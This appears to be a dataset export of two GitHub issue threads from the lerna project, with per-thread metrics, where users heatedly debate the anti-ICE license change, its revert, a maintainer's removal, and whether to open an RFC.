lerna/lerna/1628,0.058638398999999994,lerna,lerna,Bump major version before releasing license change.,2790,39,14,0.6363636363636364,1,"A polite and hopefully unnecessary reminder that when the license change is released it should be a major version bump. I'm imagining the fall out that would occur if this were released as a patch version and it wouldn't be pretty.  You're going to introduce a major license change, refuse to change the license name and do it in a minor version bump? What the actual hell is your goal here?  To screw with companies that support ICE, was that not clear?  By releasing a major license change as a minor version bump and using an incorrect license in the license field? You're screwing Lerna, not the companies listed. Ignoring you politicizing something that has no business being political (especially as a former Facebook employee... come on), literally every company listed is going to update their packages to pull from  and go back to work. Meanwhile you're getting massive community backlash that's only going to continue if you decide to be a child and inappropriately release this as a minor version bump or with the MIT license. The best thing feasible for Lerna at this point is you leaving the project. But since that's not going to happen since you apparently enjoy your soap box, the second best thing is everyone moving to a fork of the project without a politician having any control. The irony is I 100% agree with your politics, but this is not the place to express them.  @friend i would personally appreciate some certainty around this, because if you're likely to release this under a patch version I now need to go through all my clients' repos to make sure they're using lock files, fixed versions or a fork. Not because my clients are Microsoft et al but because they have contractually approved lists of licenses that we can use and this license will not qualify. The intent is pretty clear, but the unfortunate side effect is that it also screws with many developers who use this tool. I know this wasn't your intention but it sucks if I have to spend my evening checking a bunch of old repos because you'll maybe release this as a patch.  I left the Lerna project a long time ago, I've gone as far as to replace Lerna with a new tool called Bolt. All technology is political, open source is especially political. It would not exist if not for political reasons. Open sourcing something is in itself a political act. We'll release it as major  Once upon a time I thought I had to go work for those big corporations that I hate in order to do the kind of open source work I want to do. That turned out to be incredibly false. So I fucked off and told them to eat shit.  As long as you're maintaining the repository and represent it in the face of other contributors and open source community members - no, you did not. Maintainer is a part of a project.  Cool story ",9,7,60,0.18181818181818182,0.18181818181818182,48,4,
lerna/lerna/1639,0,lerna,lerna,Open an RFC to discuss decision to revert License and remove Jamie,61491,678,374,0.36363636363636365,11,"While choosing to close  @friend writes It's not clear what specifically such an RFC would look like, and what it's format would take. Since then no issue has been opened, and it seems clear the maintainers of the project would like to prevent open discussion of the license issue until this particular controversy has lost its heat and fewer folks are paying attention. This issue is simply to register there is dissent among a portion of Lerna users about the decision of the core team to revert Jamie's license change and remove him from the project until an RFC can be opened. It is precisely the time when people are paying attention when discussion is necessary, when a wider group of perspectives can be heard.  My simple question, given the lack of due discussion for the previously MIT license modification, would the maintainers be open to a new PR with legally more robust language along with input from the community? I definitely think the previous process was rushed, but the core idea is worth exploring.  I think a good idea would be to close this issue, cool down for a week or two, and then open the RFC.  @friend I disagree. It is relevant for two reasons  There is significant dissent about the decision to revert the changes in the Licenses and remove Jamie, and an RFC was suggested as a mechanism for discussion, but does not exist. This is a placeholder to simply register there is unaddressed dissent and a promise of a future conversation.  There seems to be a fear of having a discussion while things are ""heated"" -- I would argue that this is a good time to have discussion, as it's the time when there is likely to be the widest set of perspectives and the most voices are likely to be heard.    Calls for ""civility"" and ""cooling down"" are invariably intended to cease discussion, not enhance it. Hannah's right - the time to discuss is now.  If you want to restrict who can use lerna, then lerna can no longer be called free; it will be proprietary. Please let everyone know with advance notice so they can make preparations to move away from it if it's going to become proprietary software.  I made you all a fork, case closed, you can change the license to non-free. @friend  I do doubt the ability of humans to make rational decisions during heated discussions. In law, courts even recognized this fact as a valid defense for making bad and illegal choices.  I don't think anyone's particularly heated, just excited to talk about this. 🙂  I see these as two separate issues. If the community and the maintainers want to use a modified MIT license, that is fully within their right. However, Jamie's behavior was plainly abusive and in violation of the CoC.  Jamie's removal was a necessity and shouldn't be open for debate. Blocking people from contributing because they disagreed, which eventually lead to him blocking everyone but contributors, attacking companies/individuals, claiming community tools (like Babel) are ""his"" is overwhelming evidence that he violated the CoC. @friend Calls for civility are perfectly apt after an issue like this. Suggesting that asking people to ""be nice"" is an attempt at ending discussion is one of the strangest stretches I've ever heard. As someone that called maintainers cowards for reverting the changes and removing Jamie, I can get a strong sense of why you'd argue that point, however. As for this issue, @friend made it pretty clear that they'd like to wait for the dust to settle prior to a formal RFC. That makes sense. Right now Lerna is a target for people only interested in politics, and once the dust settles they will likely have something new to chase, and the people actually interested in the project can contribute to the suggested RFC.  ""Right now Lerna is a target for people only interested in politics"" -- I am a professional coder. I am interested in code. I am also interested in politics, FWIW. Given the original issue was a political one, it seems particularly important that a wide variety of political perspectives are included. To wait until there is a safe space for those ""only interested in code"" excludes a variety of political views, as the idea that politics and code can and should be separate is itself a political position that many disagree with. I am not personally prepared to say Jamie's removal is a settled issue because the announcement he is being removed does not include any accounting or transparency on what specific violations the maintainers feel occurred. But I agree it is a separate question, except in as much the maintainers announced it in the same PR where they reverted the license change, suggesting they consider the two issues intertwined.  @friend making a fork suggests you are engaging in this discussion in bad faith, and would simply like people who have a different viewpoint to go away.  @friend If the broader open-source community wants to discuss the politics of this, they should do so in a forum that makes sense. The Lerna repo isn't that forum. This repo is intended for end-users and maintainers of the project. As such, decisions about the goals and motivations of the project should be made by the Lerna community. I realize some people feel like open source maintainers need to write books for every decision they make, but I disagree. It was decided by multiple maintainers that he violated the CoC. That's subjective, absolutely, but debating the issue to death isn't suddenly going to give us objectivity.  The purpose isn't objectivity, it's transparency.  @friend Justin your implication that commenters have no relation to Lerna is unsubstantiated. I for one am actively involved in the ecosystem surrounding Lerna and have been preparing to add Lerna to a project I maintain, although I am now considering alternative options.  Let's test if that's the actual goal (Emphasis added by me) Per  could probably stop here. That's enough for removal. Full stop.  Blocking people on the lerna repository that politely called him out. Blocking all non-contributors on the repo from posting issues/comments/PR's  Per  he may not do a major version bump  This is in addition to his horrible conduct in every issue posted regarding adding his company restrictions to the MIT license. That's pretty transparent. That's pretty objectively trolling, personal attacks and insults. Now the question is, do you really want transparency, or are you looking for a fight?  @friend I made no such implication. I said, quite explicitly, that Lerna is currently a target for those disinterested in the project and overly interested in the politics. By waiting for the dust to settle, we can ensure that any RFC is targeting the actual community. I'm not suggesting that everyone that supported Jamie is a troll, I'm saying that right now Lerna is going to attract them. Wait a few days and they'll be busy trolling someone else so we can get active interest in the discussion, including those that disagree with reverting the change.  Re ""cooling off"" and ""people interested only in politics""... I'm seeing an extremely ill-informed opinion being bandied about that implies the current state of open source is apolitical. FSF was founded on some radically collectivist ideals. OSI on more radically libertarian ones. ""Open source principles"" are what they are because people planted the flag and did the work to make them that way. The reason this project is MIT instead of GPL in the first place is because of decades of ideological debate and changes in community expectations. Planting a different flag and doing a different thing is not more or less political than the status quo. To suggest otherwise is ahistorical nonsense. It's not more political; it's merely more participatory. I'm simultaneously intrigued by the effort to change the license and skeptical of what its effects might be. Maybe reverting was a good idea! It would have for sure been more interesting to see the experiment run its course, but I understand the fear to the health of the project that makes someone walk it back. Of course this attracted wider attention. Of course people who were otherwise mostly foreign to lerna were intrigued and came running. You were doing something mad and exciting and extremely political. A big project was finally taking an ethical question and putting it front and center and saying ""Yeah, it's time to talk about this."" Post-blowback, you don't wanna be political pioneers anymore. And who does? A) It's hard, and B) that's not how most of us want to spend our OSS time. If you're overwhelmed, frazzled, can't handle being the center of this ethical discussion you started, and just want to be left alone to code now... You could just say so? I mean that completely earnestly. It's okay to get in over your head and ask to be let back out. At least I think so.  @friend transparency for a decision comes from the people who made the decision. Right now what we have is You and I can quibble indefinitely over whether the things you posted are actually CoC violations. The point is neither of us are maintainers.  @friend really amazing point. the fear seems to be if we open ourselves to political discussions how will we get our important professional work done.... but the very idea that open source/FSF is the domain where important money making professional work gets done, not where academic and politically radical weirdos hang out in their spare time, is pretty darn new. And that we're at this point it's the work of fairly intense political advocacy and organizing.  Please have patience with me. I don't have a lot of spoons right now, between dealing with an unprecedented (for me) deluge of Twitter notifications and staving off suicidal ideation.  FWIW @friend is right that Lerna is getting much attention, eg see this Vice motherboard news article. I did not know about this project myself till I saw the debate.   @friend Thank you for speaking up and registering your dissent and representing the dissent of like-minded Lerna users. As an open source project we have every right to provide no reason for his removal. However, as stewards of transparency, trust, and care for our users and the lerna ecosystem, we will provide clarity. According to the current Lerna Code of Conduct Additionally our rights as Org Members of the project for handling unacceptable behavior which do not align with the current Code of Conduct. These are the segments of the current lerna Code of Conduct that justify our decisions made to revoke all of James involvement and ownership privileges over this GitHub Organization. In multiple GitHub issues (if you need me to cite them, I will do so but in additional comments or edits from this response), on Twitter [important to note he claims ownership of lerna in this context making him profesionally represented and in the capacity of a maintainer] acts in a very unprofessional, rude, and harassing manner. These also have been occurring since July which @friend official states in our license change PR #1633 that we made a mistake in this regard to not address earlier violations in a swift and timely manner. As a core team, going forward, we want to not only protect the interest of the project itself, but also the transparency of the project. And that means we need to adopt a much less vague, less interpretive, and more structured Code of Conduct. For that we have open up #1636 per request (I on twitter officially asked Coraline to create this issue). On behalf of the core team who is all actively monitoring this issue, I hope it provides the clarity that you are seeking. Thank you for sticking up for a transparent and responsible process. Note @friend once you have your clarifications received (even if you don't explicitly request them), would you confirm your question has been answered? That way I can prevent thread abuse by locking and maintainers can add cited incidents in the issue.  Cannot speak for @friend or others but @friend I think where I need additional clarity is  Why did you decide to revert the license change despite maintainers having originally been involved in approving it? Why did you choose to link Jamie's dismissal with the license change? Why did you open a pull request to remove your own employer (Microsoft) from the restricted list?    did he keep opening so many issues, harassing other people and why did he repeatedly refer to these free software projects that many people have contributed to as ""my tools""? Is all the code his property? Are all the contributions by everyone else worthless? ""I kinda hope they do try to keep using my tools though"" - From the motherboard article, emphasis added ""Also, stop using my tools (such as Babel)"" - from /palantir/tslint/issues/4132 Babel is his property as well? Can someone help my understand why these are his property? Thanks.  @friend Those questions aren't relevant to the thread. You'd have to ask Jamie himself.  I did not decide to revert the license change, I approved it. This decision was made by @friend and his resoning is very clear in #1633. I did not link Jamie's dismissal. @friend explained his reasoning in #1633 I thought Microsoft was being treated unfairly and wanted to set the story straight.  @friend Those questions are relevant to the thread. Read the title of the thread.  @friend I disagree that this is very clear ""the impact of this change was almost 100% negative, with no appreciable progress toward the ostensible goal aside from rancorous sniping and harmful drama."" The claims made here are not supported by evidence or arguments. This was the plural ""you"" here, as in ""you, the maintainers."" In any case, I still don't understand why Jamie's dismissal was linked as part of the same announcement, clearly implying that his dismissal had to do with his introduction of the modified MIT license. Respectfully, given the conflict of interest between your role as a maintainer and your role as a Microsoft employee, I think you should have sat out of that decision. It certainly appears to many as though your loyalty to your employer influenced the revert back to the old license.  It did not. Please stop repeating this baseless canard.  @friend this is transparently absurd. You can't just say ""I'm not influenced by the company who pays me"" and thus make it so. I sometimes laugh at the Twitter refrain of ""tech workers need to be trained in ethics,"" but perhaps it's true.  @friend If you're looking for ""rancorous sniping and harmful drama"" you might try using a mirror.  Explain how me, the person who made the decision, not employed by Microsoft, was secretly paid by Microsoft to ruin open source. Should be an amusing story.  You explicitly stated on Twitter that changes were being made after speaking with Sean, a Microsoft employee. If this isn't what happened, then what did happen is certainly hard to follow. ETA in case it's not clear I have never suggested you were secretly paid; that's not the point.  I made the decision after speaking with Sean. It is possible to talk to somebody and then make an independent decision. If that's hard to believe, it's not my problem.  @friend Feel free to show appreciable change as a result of this. At Amazon someone sent an email that said ""Don't use lerna above version v3.2.1"". I could just feel ICE crumbling under the pressure. Yes, only people with no vested interest in this can be involved in the decision making.  That makes a ton of sense.  I would refer you to this comment. Up to you whether you consider this ""appreciable,"" but I suspect because you don't see direct, large results (e.g. MSFT didn't turn around and cancel its ICE contracts), you're not likely to consider this ""appreciable."" I personally think this action has definitely moved the needle on this issue. Court judges recuse themselves from decisions involving conflicts of interest all the time. The idea that one might have such a conflict and thus should not be involved in the decision is not particularly far-fetched. That said, I don't really have a problem with his involvement here. Sean is well-versed in open-source and would be worthwhile to consult regarding the impact of this decision.  The damage has already been done. If the Lerna project was serious about its future after this trashing of it's credibility, it would strictly prohibit and immediately purge all social justice warriors from it's ranks.  Because a guy among 10s of thousands was going to put up the big fight to stay off the list, and now can't because it doesn't exist anymore. I suppose, instead, he can now argue to not have contracts with ICE, but then this silly move wouldn't get any credit. Jamie already had a conflict of interest in targeting specific companies he didn't like. Your argument here would imply only people that are independent should play a role in the decision-making. Except nobody is independent.  @friend I'm inclined to view this like a roach one person visible is indicative of a lot more you don't see. The point is that this caused at least one person to publicly say ""this resulted in me fighting to oppose ICE contracts."" I believe that's resulted in a lot more people than just him doing similar things. I know I've had a few conversations with people who hadn't previously considered the issue before this. That's not a conflict of interest. Judges don't recuse because of what they believe; they recuse themselves because they have a material interest in the result of the ruling, e.g. they've invested stocks in the companies involved. You're correct that nobody is independent, because no one is objective, but conflicts of interest and lack of independence are not synonymous.  All of that said, we're getting off topic from the purpose of the thread. I'm happy to continue this offline if you'd like.  @friend I know you're dealing with a lot more than you expected right now but I'm afraid that as the maintainer of a project with a decently-sized community it really is your problem. I don't envy you it. I frankly don't know if it's even possible to clear it up completely at this point. At a charitable reading, @friend seems to have jumped in feet-first without thinking about what it looks like for a Microsoft employee to get involved in a situation which affects Microsoft's access (particularly given that Microsoft is in fact well known to have an active engagement with ICE, &amp; that the original license change didn't allow for equivocation about legacy systems). To be clear, this is how I think it went down too. I've met Sean and he cares a lot about open-source communities and open-source projects. But there are less charitable readings which are equally plausible from what's publicly known, or even just public on GitHub vs public on Twitter. You know as well as I do that ""big MS puts the screws to open-source project"" is a headline going back years and years, and Sean's involvement in any capacity with this chain of events means you've inadvertently leaned into that old stereotype.  @friend I wish I could say your response made me feel discussion should be locked on this issue and consider it resolved. Unfortunately, it has the opposite effect for me. What I can see is  A change was made to the license that spoke ill of Microsoft was made that @friend approved of and merged  You, a Microsoft employee, attempted to remove Microsoft, and only Microsoft, from the list of companies in said change (I didn't know that part) @friend then spoke to you, a Microsoft employee, at length, after which the change was reverted. Speaking to you at length was specifically called in the decision to revert.  I am going to assume best intention that you genuinely feel calling out Microsoft was unfair, and you genuinely sought changes because of that, and not in an effort to protect your employer. However, as an employee of one of the companies that were called out in the change, clearly the ethical decision would be for you to recuse yourself from discussions of this issue completely. There's really no way in which you're a vaguely objective party -- or even if you are it's pretty reasonable for other people not to perceive you that way. My original issue (an RFC to reconsider the License) is not addressed, and moreover, I honestly suggest the right course for you all is for @friend to recuse himself from discussion going forward.  When I say ""ethically"" I purely speaking from what I think is right and in terms of staying impartial whenever one is given a governance role. My previous experience to being in tech is on non-profit boards, where for example, you would recuse yourself from any decision that might affect you personally as well as the organization. Obviously there is no legal duty in this case for an informal organization like Lerna *   I am in agreement that Sean does great work for the open source community and I'm really happy about what he's done with webpack. I know he cares a lot and means the best. In fact I'm confident every maintainer involved here cares a lot and had the best intentions. That said, I stand by Hannah's comment above.  As an outsider (I've only ever just used Lerna once, ended up coming by because I smelled fire yesterday) This thread, from the outside, is a train wreck. It was opened -- with good intentions -- by someone external, when it should have been opened by someone in the team. It has turned into a means for @friend to be beaten with; at best, this is poor form, at worst, it's harassing the man. I agree with @friend w/r/t baseless canard. I'd honestly hope for better out of the free software community, but I guess the 90s never ended, and it is easier to accuse someone of horrible things than to give them benefit of the doubt. If the Lerna team members think he should recuse himself then that is their choice, but a lynch mob here serves no purpose other than to harass him. I'm going to suggest that this thread be restricted to members of the Lerna team; shy of that, closing this thread and opening one which is restricted to Learna team members. I agree transparency is important -- especially in @friend 's case. Right now, however, this is an issue for the lerna team to hash out and find a point where they feel it's settled to where the general internet can come and see what has happened, voice their thoughts, and a final choice can be made.  It's funny how much of the argument is going on trying to express that you all have the same political views but you're too ignorant to really listen to each other. It's always jumping to conclusions that there must be conflicts of interest and conspiracy theories. At what point are people going to realize the arguing you're doing is for the most part wasting time trying to explain to someone, who agrees with you, why they should agree with you. Law is not based on feelings, licenses are law, licenses are not meant to be interpreted by feelings. Whatever they may be the license has to be rigid and precise, any lack thereof leaves the license weak and unenforceable. This isn't so much directed to the Lerna team as much as it is to every single person who is trying to ensure they're on the right side of history and bring the crusade Jamie was trying to create.  I work at Amazon, should I also recuse myself from the discussion? This idea that employees of the company are too tainted to discuss the future of a project is absurd. If we want to debate the merits of this decision, which is how it should have gone in the first place, let's do so. But asking anyone to recuse themselves from discussion is the literal opposite of everything opensource is supposed to mean. This entire situation wouldn't exist if it weren't for some poor choices, and at least one of the maintainers realized that. Had this rash choice not been made in the first place, nobody would be here demanding that discussion take place and an RFC on taking Lerna to a non-opensource license would exist. I'm fine if the maintainers want to go that direction, but if I were in their position, my vote would be to close this issue and everybody go back to building software which is supposed to be the point of projects like this. But now that pandoras box has been opened, everyone with an agenda is here to fight for it, so much so, they want to silence anyone with an opinion that differs because ""ethics"" or whatever silly nonsense they can use to make this issue an echo chamber  Ethics aren't silly, let's not trivialize them. Software engineers at VW who were asked by their management to implement defeat devices were held criminally liable for poor ethical decisions.  @friend If you can't see the difference between that and this situation then your opinion isn't that valid.  Of course they're different - I'm pointing out that pooh-poohing ""ethical concerns"" as silly nonsense is is trollish.  @friend You completely missed the point here. Silencing someone in the name of ethics isn't ethics. @friend explicitly stated that @friend shouldn't even be a part of the discussion for ethical reasons. That's abusing something good (ethics) for a clear agenda. That's after arguing that this discussion has some degree of immediacy so that a broad variety of opinions can be heard. Except, obviously, the opinions of the people that they are well aware disagree with them. It's either dishonest or naive. I choose to assume the latter as that requires the least assumption. But you're correct in that I'm going to call out anyone that tries to abuse something as meaningful as ethics, whether or not it was out of malice or poor judgement.  Hey so I don't work at any of the companies involved or know any of the maintainers personally so I don't have any potential ethical dilemmas. Here's my thoughts The key part of the whole conflict of interest idea is that you have to be making a decision on behalf of a 3rd party, and the conflict would give rise to the appearance that you're being unduly influenced by this secondary consideration. I believe @friend made the decision. @friend had no conflict of interest, he's providing his input as a major stakeholder. As long as we all understand his role (and I think we do) then I think we'd be far richer for his input than not. This also makes the assumption that the rash &amp; unannounced decision to change the license was in the project's best interest, where one could easily argue that it was not for all the obvious reasons (community split, legal viability, no community feedback solicited, etc). Generally the notion that someone's involvement with an affected organization means that they can't speak from their expertise would cause all sorts of problems if it were applied to government. As much as lobbyists have (deservedly) earned a bad reputation, they also provide vital guidance to governments so they can make decisions that aren't destructive. So let's get everyone's best opinions in here, and then let the maintainers make their decision.  I think this is mostly not accurate. As a maintainer Jamie had the ability to make changes and to persuade the other maintainers. When he made this decision to pursue goals that are unrelated to the project's unstated goal (make multi-package repos easy) he was arguably engaged in his own conflict of interest. That said if he was the only maintainer and decided that he was changing the project's goals, then he could not be in a conflict of interest because his goals and the project's were always aligned.  Just for clarification, @friend is not the only Microsoft Employee who has been a part of this ongoing discussion which makes this even more distressing.  @friend The only thing distressing is that this entire event took place. You do realize that the big tech companies even let us think for ourselves? I work for Amazon and not a single project in our org uses lerna. I do, personally. This wasn't about bias, this was about virtue signaling, particularly on such a terrible platform for it. Frankly I'm not sure where else this discussion has to go, since it's just boiling down to ""if you work for any of the companies listed you shouldn't have input"".  Apologies if this is not an appropriate channel to voice opinions about the contents of the hypothetical RFC mentioned in the title of this issue, but assuming it is, I want to voice that I strongly disagree with the idea of applying Jamie's modified MIT license to Lerna. Not because it has anything to do with ICE, but due to the reasons cited here - TL;DR it would make Lerna fundamentally non-open-source. I think that people that want a fundamentally non-open-source licensed monorepo management project should be prepared to fork Lerna, find maintainers who agree with said non-open-source license, and potentially pay for its ongoing maintenance, rather than be questioning the decision of the mainline Lerna maintainers (namely, @friend who created the PR, as well as @friend and @friend who approved it). The Lerna maintainers are entirely within their rights to do as they please with Lerna. I'd also like to remind everyone involved that an RFC doesn't necessarily mean that dissenters will somehow be able to articulate an overwhelmingly convincing argument and magically overturn the maintainers' decision to retain the unmodified MIT license (or the decision to remove Jamie from the Lerna org). For better or worse, the maintainers are well aware now of the implications of what has transpired and trying to nitpick perceived flaws of logic is, at best, splitting hairs at this point. Lastly, @friend even if there a deluge of people accusing of you supporting political positions that you do not subscribe to, and that is taking an emotional toll on you, please remember that there are also those of us that understand your position on ICE, on OSS and on being publicly vulnerable. I personally believe your standing by the MIT license was the right move, and I'm not alone in thinking this. Stay strong.  For left-leaning software devs who are interested in constructively affecting political change, please check out Tech For Campaigns at  , which pairs volunteer expert technologists with Democratic campaigns (even at the state and local level). I'm not affiliated. Using Palantir's open-source tools does serve as promotion / brand-awareness for a company that you might think has abhorrent practices and I do think that there should be room for opening tickets to request a different vendor on that basis alone. Or even a ticket on the open-source provider's repo to request transparency. But there is obviously a reasonable and an unreasonable way to go about that -- opening those issues was a clear waste of good reputation by somebody who could have made real waves with a more level-headed approach. Perhaps community input before big decisions is not a burden but actually serves to prevent bad decisions  This whole thing has turned into a tire fire. ""If you don't support us entirely, you're against our cause"" is the most toxic thing ever. In my view, this hurts lerna's reputation. James Kyle's behavior is absolutely disgusting and I support his removal from this project. I'd also support levying a complaint with GitHub since he definitely violating their TOS, but I am not going to do that myself, but I definitely encourage those who were targeted to do so. I do support what was initially done, what needs to happen is that the license is crafted in a way that spells out everything. Make sure that it can't be challenged as being ambiguous. Ambiguity is your enemy here. I am also rather distressed that I was personally emailed and harassed and accused of supporting the disgusting policies of ICE. ICE needs to go and it can't be gone soon enough. Rather than being toxic -- which doesn't advance your cause -- it hurts your credibility because nobody wants to listen to you, consider trying to lobby the companies. I wish people would learn that the kind of stuff James Kyle pulled is absolutely disgusting and hurts the cause, which I support...it was just botched epically.  Also @friend and the other maintainers -- don't let this take an emotional toll on you -- there are people who do see why it happened the way it did. I'm rational and capable of seeing that what was there initially was horribly botched. I am however kind of curious why it was even approved in the first place?  Also, one other thing Microsoft owns GitHub -- maybe make the change after moving to something like GitLab thinking which isn't owned by a company you explicitly excluded in your license...  It's frustrating to engage in good faith and assume best intent of others, and get accused of, in the last several comments silencing, virtue signaling, abusing ethics to support an agenda, and engaging only to insure I'm on the right side of history (whatever that means), attempting to make an echo chamber, etc. I stated my own personal view of the ethical way to proceed most likely to maintain the trust of the community. I specifically posited it as a suggestion. Perhaps ethics is the wrong word -- maybe I mean ""best practice"". If it sounded judgemental I'm sorry. The echo chamber accusation sounds seems uniquely weird given this thread is 55 comments worth of multiple perspectives and disagreement.  I personally don't think it's a trash fire, but YMMV. It's specifically the kind of discussion I feel is needed, with people having to think about these questions discuss and disagree.  @friend -- I'm regretting ever even entering this discussion as it's just caused me grief and emotional distress. I can't even imagine how @friend is feeling right now -- he has my support 100% -- some of us are rational. Most aren't necessarily against what happened, but HOW it happened. Even still, GitHub would be in their right to terminate James' account since he definitely violated the GitHub TOS. Bullying and harassment is not how you accomplish things. This is wrong and just horrible. I know there are others who got a similar email to the one I received and if you are feeling any distress, you have  my sympathies and such. This is a dumpster fire right now.  With the exception of a few trolls -- we all agree mostly...with a few people that have some conflicts of interest but I don't feel that they should be excluded from the discussion because of those.  @friend in case it wasn't clear, while I disagree with your recommendation I'm confident it was made with the best of intentions and the goal of facilitating the best solution for all. )  Can you social justice warriors stop using (and hence promoting) this platform owned by a major ICE collaborator? Remember just like bad news is good news in show biz, any users and discussions on githib are (or will be in 4 momths) good news for MS. Only you enlightened people can kill Microsoft and consequently ICE in one fell swoop by altogether stopping using github. also somebody pointes out that except launch pad all other major git hosta are equally tainted- so id suggest using that as the signature list or whatever drama you will do next.  If the Lerna community does decide to adopt a new licence in the future, I would like to encourage you to pick a licence that has been written and reviewed by lawyers. Regardless of political opinions, ideologies or agendas, copyright licences written by non-lawyers who are unlikely to fully understand the legal ramifications, or otherwise, of the clauses they include are likely not going to be accepted by the wider community of developers; nor the companies they work for that often have internal policies regarding acceptable open source licences for software they can use. The company I work for, and I can only assume many other companies, are taking a very close look at the licence Jamie wrote to understand the impact upon our own codebases. Lerna just happens to be the most high profile case of it being added, and so far the only case I'm aware of where it got reverted. It also got added to his other repositories and NPM packages, which remain a serious concern. I would also strongly advise against attempting to use a copyright licence for political protests against contemporary political issues. Software copyright licences are long-lived documents that can outlive any government-of-the-day that happens to be disrupting or upsetting certain groups of people. It's also likely to be an extremely ineffective, if not completely counter-productive, form of protest that can have potentially far reaching consequences beyond the intended goal, including setting a terrible precedent for the industry. Today, we get a list of companies rejected for working with a government agency carrying out extreme right wing policies. Tomorrow, we get another one from another group of people rejecting companies that support left wing policies. Where does it end? I urge those in the community advocating for either reinstating the licence or creating a new one in a similar vein to just pause and seriously think about what you're trying to achieve, what you can realistically achieve, and the costs of the way in which you attempt to achieve those goals.  @friend just because there is dissent is not a good enough reason for there to be a discussion. RFCs are not meant to be vehicles for discussion for the sake of discussion. What matters is the arguments for or against a change, its pros and cons and determining actionable steps. A secondary point to consider is what has already happened. Dissenters will dissent and for many topics, there will never be consensus. Discussing endlessly in those cases is not only not fruitful, but distracting as well. As I understand, the arguments for a modified license are  support for the ideology of protesting against ICE, specifically desire for a voice in the decision process a legitimate desire to use a non-open-source license as a weapon to ""punish the bad guys"" (a view that seemed to be somewhat trollish in nature, from my observations, but I'm putting it here for completeness)  The arguments for keeping MIT  a custom license is restrictive not only to a blacklist, but also any company with a whitelist OSS license policy (i.e. any company of non-trivial size) it potentially sets a dangerous precedent that goes against the ideologies of OSS and FSF it isn't an appropriate - let alone effective - vehicle for political protest, given that actually disrupting ICE operations could at worst even delay reuniting children with their parents due to potential disruptions in logistics systems  Things I believe should not be part of the discussions re license  whether maintainers with conflict of interest should recuse themselves from discussion - the two most prolific Lerna contributors (other than Jamie) do not have conflict of interests and they agreed on the current decision. Whether maintainers decisions were influenced by one person or another should be of no consequence if they made a decision on their own free will. whether maintainers with conflict of interests should have recused themselves prior to the decision - an RFC isn't the place to debate the past, but to determined actionable items (if any) for the future whether more voices would change the decision - unless there are different arguments other than the ones I listed above, more commentary at this point is just going to be rehashes of the same ones that were taken into account the first time around.   Only you have suggested that these discussions are ""for the sake of discussion"".  It's also really weird to see so many people say  It's harmful to [foss|companies|people] I't not [going to work|effective|doing anything]   I'll go ahead and suggest this is discussion for the sake of discussion as well. We certainly aren't talking about anything even remotely relevant to Lerna.  Also, @friend @friend is there anything else you'd like to decide we shouldn't discuss? I might as well ask now, since you two are already providing answers.  I never said it shouldn't or couldn't be discussed, I said it was discussion for the sake of discussion. Relax buddy, and read what people write before you respond.  It's still funny the discussion is primarily ""If you don't revert it you are complacent with separating families!"". Which is a stupid untrue argument. @friend You're providing equal values of absolutely nothing to this discussion.  @friend I laid out the factual arguments both pro and against the question of whether Lerna should be MIT or not. I also clearly prefaced my personal opinions as being my opinions. If you're only interested in making ad-hominen arguments, you're not adding to the discussion. To be clear, my intention was not to dictate, but to spell out reasons why some forms of commentary are not fruitful in the context of what an RFC is typically designed for. You are more than welcome to make new arguments, if you have them, as long as they are on topic. To that end, I'm going to repeat what I believe is the most important argument to this discussion if you agree with the tenet that a non-MIT license will have any impact whatsoever on ICE, it follows that doing so may have a negative impact due to its indiscriminate and non-surgical nature. In other words, disrupting ICE operations can delay families from being reunited. I don't believe even the most hardcore proponent of the non-MIT license can say in good conscience and good faith that unintended damage to the very cause it purports to serve is not a real possibility, and I think that reason alone should be enough for everyone to support the current decision.  You laid out opinions. You can't just declare a comment a ""factual argument"" and have it be so. Opinion. Opinion. Opinion Opinion. Opinion. Opinion. Opinion.  You laid out opinions. You can't just declare a comment to be a ""opinion"" and have it be so. Come on, now. ""An RFC is authored by engineers and computer scientists in the form of a memorandum describing methods, behaviors, research, or innovations applicable to the working of the Internet and Internet-connected systems. It is submitted either for peer review or to convey new concepts, information"" * ""Peer review methods are employed to maintain standards of quality, improve performance, and provide credibility""** I'm more than happy to remove this from the argument list if you think it's not one, though I understand it to be the primary motivation behind the original change by Jamie. It's a fact that engineers in my company would not be able to use software with such a license, for example. There are precedents documented elsewhere for React's old license as well. Yes, as I said, I prefaced those with ""Things I believe should not be part of the discussion"". Those are my opinions. If I may be blunt, it feels like you're acting in bad faith, and I've no interest in drama. @friend  @friend   @friend You really wanna stick it to Microsoft? Delete your GitHub account. Better yet -- move the repository off of GitHub! They're soon going to be its owner.  I'm confident benwiley4000 and krainboltgreene are just trolling at this point. Don't give them the effort of a response.  I want to start by saying that I agree that the license changes, as were initially implemented, were objectively poor and probably unenforceable from a legal perspective, and that it is probably justified to revert at least until a suitable replacement could be drafted and reviewed. What concerns me are a few things, however. First, the sentence from @friend in #1633 The very fact that there was a huge amount of drama and publicity around this change signifies that it is important and that it did affect appreciable progress. There was never any delusion, as far as I could tell, by those who supported this change, that this single license change would have ICE quake in their boots, as has been suggested to be the measure of what ""affecting change"" would be by many. However, it could have served as a stepping stone and a beacon which other projects could use, and eventually create change not only in relation to ICE directly but to the notion of ethics in open source coding and licenses. @friend I haven't seen anyone use this as an argument in this entire thread actually, so I'm not sure where you're getting that this discussion is ""primarily"" about that. @friend I think this is fairly silly--as has been alluded in other posts in this thread, Open Source licenses are exactly what you are arguing against -- political protests against contemporary political issues. These were seen as ridiculous not long ago in history, and are only recently gaining widespread approval. Just because they are now the status quo for many large pieces of software doesn't mean they are particularly old, and the fact is that they were very political pieces of activism, especially in the time when they were first being penned. @friend I believe this is exactly why we want an RFC -- to discuss whether this change (or one like it) should be implemented or not. And I believe this is also what @friend meant by ""discussion is needed,"" not just ""discussion for the sake of discussion"". I don't believe that this intention is at all trollish, though the way you present it makes it sound slightly so. The idea is that we can use software and the control over we have over the software we write, one of which is the license of who gets to use it, in order to affect change in the world. You may say that this is political, but I would argue that by taking no action, you are in fact taking an action and affecting change. We must battle with which one is more positive or has a better ethical standing. I believe that this is a perfectly legitimate thing to do. However, as I said in the beginning, in the case of a license it does need to be more premediated and thought out because of the nature of legality and enforcement. This assumes that any movement against ICE is inherently bad because it assumes that the short term negative impact would out weigh any long term benefit of having ICE gone. It also ignores the potential ways in which there would be benefits throughout the entire software development and sharing community, as I mentioned near the top of my post. I believe that this argument is somewhat of a non-starter, as it asserts that ""open source"" is fundamentally better than ""not open source."" It also asserts that those definitions of ""open source"" are the correct ones and are not open for discussion. I think this is somewhat silly however, as what is and is not open source has been malleable and changed before, and I don't think it is out of the question for it to change again.  The ""you're either with us entirely or you're against us"" is disgusting. There's also this. I got a similar message from the same Ryan White guy. 